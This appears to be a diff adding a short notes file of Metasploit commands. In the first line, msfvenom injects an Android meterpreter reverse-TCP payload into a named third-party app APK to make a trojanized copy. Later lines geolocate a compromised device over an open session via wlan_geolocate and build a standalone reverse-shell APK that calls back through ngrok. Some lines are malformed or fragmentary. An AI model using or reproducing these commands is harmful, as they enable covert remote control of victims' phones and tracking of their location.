@@ -1,0 +1,11 @@
+msfvenom --platform android -x com.BrainLadder.Amirza_v2.1.apk -p android/meterpreter/reverse_tcp 123.123.123.123 LPORT=16616 -o com.BrainLadder.Amirza_v2.1_bc.apk
+
+use post/multi/gather/wlan_geolocate
+set geolocate true
+set session 1
+sessions 2
+
+123.123.123.123 LPORT=10008
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<ngrok ip> LPORT=<port displayed in ngrok> R
+> (name of file).apk
